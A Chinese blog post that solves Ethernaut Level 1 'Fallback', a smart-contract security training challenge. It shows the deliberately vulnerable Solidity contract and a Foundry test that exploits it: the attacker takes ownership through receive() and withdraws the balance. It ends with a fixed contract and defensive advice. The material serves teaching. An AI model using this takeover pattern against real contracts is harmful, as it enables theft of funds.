---
title: 'Ethernaut Level 1: Fallback - 回退函数权限提升攻击'
date: 2025-01-25 14:10:00
updated: 2025-01-25 14:10:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - Fallback
  - 权限提升
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "学习如何利用 Fallback 函数的权限验证漏洞实现合约控制权获取，这是 Ethernaut 系列的第一个基础攻击技术。"
---

# 🎯 Ethernaut Level 1: Fallback - 回退函数权限提升攻击

> **关卡链接**: [Ethernaut Level 1 - Fallback](https://ethernaut.openzeppelin.com/level/1)  
> **攻击类型**: 权限提升、Fallback 函数漏洞  
> **难度**: ⭐⭐☆☆☆

## 📋 挑战目标

这是 Ethernaut 系列的第一个正式关卡，目标非常明确：

1. **获取合约控制权** - 成为合约的 `owner`
2. **转出所有余额** - 提取合约中的所有 ETH

![Fallback Challenge](https://github.com/XuHugo/Ethernaut-Foundry-Solutions/raw/main/imgs/requirements/1-fallback-requirements.webp)

## 🔍 漏洞分析

### 合约源码分析

首先，我们来分析目标合约的关键代码：

```solidity
contract Fallback {
    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if(contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    // 🚨 关键漏洞点
    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }
}
```

### 漏洞识别

通过代码审计，我们发现了两种成为 `owner` 的方式：

**方式一：通过 `contribute()` 函数**
- 需要贡献超过 1000 ETH 才能获得控制权
- 每次调用限制最多 0.001 ETH
- 需要调用超过 100 万次，成本过高 ❌

**方式二：通过 `receive()` 函数** ⭐
- 只需满足两个简单条件：
  1. `msg.value > 0` - 发送任意数量的 ETH
  2. `contributions[msg.sender] > 0` - 之前有过贡献记录
- 满足条件后直接成为 `owner` ✅

### 攻击路径

1. **建立贡献记录** - 调用 `contribute()` 发送少量 ETH
2. **触发权限提升** - 直接向合约发送 ETH 触发 `receive()`
3. **提取资金** - 调用 `withdraw()` 提取所有余额

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public instance;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // 部署目标合约
        instance = new Fallback();
        
        // 给攻击者一些初始资金
        vm.deal(attacker, 1 ether);
        
        // 给合约一些初始余额
        vm.deal(address(instance), 1 ether);
    }

    function testFallbackExploit() public {
        vm.startPrank(attacker);
        
        // 步骤1: 先贡献少量ETH以满足contributions[msg.sender] > 0
        instance.contribute{value: 0.0001 ether}();
        
        // 验证贡献记录
        assertGt(instance.getContribution(), 0);
        
        // 步骤2: 直接向合约发送ETH触发receive()函数
        (bool sent, ) = address(instance).call{value: 1 wei}("");
        require(sent, "Failed to send Ether to the Fallback");
        
        // 验证已成为owner
        assertEq(instance.getOwner(), attacker);
        
        // 步骤3: 提取所有资金
        uint256 initialBalance = attacker.balance;
        instance.withdraw();
        
        // 验证资金提取成功
        assertGt(attacker.balance, initialBalance);
        assertEq(address(instance).balance, 0);
        
        vm.stopPrank();
    }
}
```

### 运行测试

```bash
# 运行 Fallback 关卡测试
forge test --match-contract FallbackTest -vvv

# 输出应该显示所有断言通过
```

## 🛡️ 防御措施

### 问题根源

1. **权限检查不当** - `receive()` 函数中没有适当的权限验证
2. **逻辑设计缺陷** - 允许通过简单条件获得完整控制权
3. **函数职责混乱** - 接收资金的函数不应包含权限变更逻辑

### 安全修复建议

```solidity
contract SecureFallback {
    mapping(address => uint) public contributions;
    address public owner;
    
    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }
    
    modifier onlyOwner {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }
    
    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        
        // ✅ 提高门槛，避免简单的权限提升
        if(contributions[msg.sender] > contributions[owner] && 
           contributions[msg.sender] > 10 ether) {
            owner = msg.sender;
        }
    }
    
    // ✅ 移除权限变更逻辑，只处理资金接收
    receive() external payable {
        // 仅记录接收的资金，不修改权限
        emit FundsReceived(msg.sender, msg.value);
    }
    
    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    event FundsReceived(address sender, uint amount);
}
```

## 📚 核心知识点

### 1. Fallback 和 Receive 函数

```solidity
// receive() - 接收纯ETH转账时调用
receive() external payable {
    // 处理逻辑
}

// fallback() - 调用不存在的函数或带数据的ETH转账时调用
fallback() external payable {
    // 处理逻辑
}
```

### 2. 权限设计原则

- **最小权限原则** - 给予最少必要的权限
- **权限分离** - 不同功能使用不同权限级别
- **权限检查** - 在关键操作前进行充分验证

### 3. 安全开发最佳实践

- **避免在特殊函数中实现关键逻辑**
- **使用 OpenZeppelin 的 Ownable 模式**
- **充分的单元测试覆盖**
- **代码审计和同行评审**

## 🎯 总结

Fallback 关卡虽然简单，但展示了智能合约安全的基础概念：

- ✅ **函数职责分离的重要性**
- ✅ **权限验证的必要性** 
- ✅ **特殊函数的使用注意事项**
- ✅ **Foundry 测试框架的基本使用**

这是学习智能合约安全的良好起点，为后续更复杂的攻击技术打下基础。

---

## 🔗 相关链接

- **[下一关: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**
- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**

---

*在智能合约的世界中，最简单的漏洞往往隐藏着最深刻的安全教训。* 🎓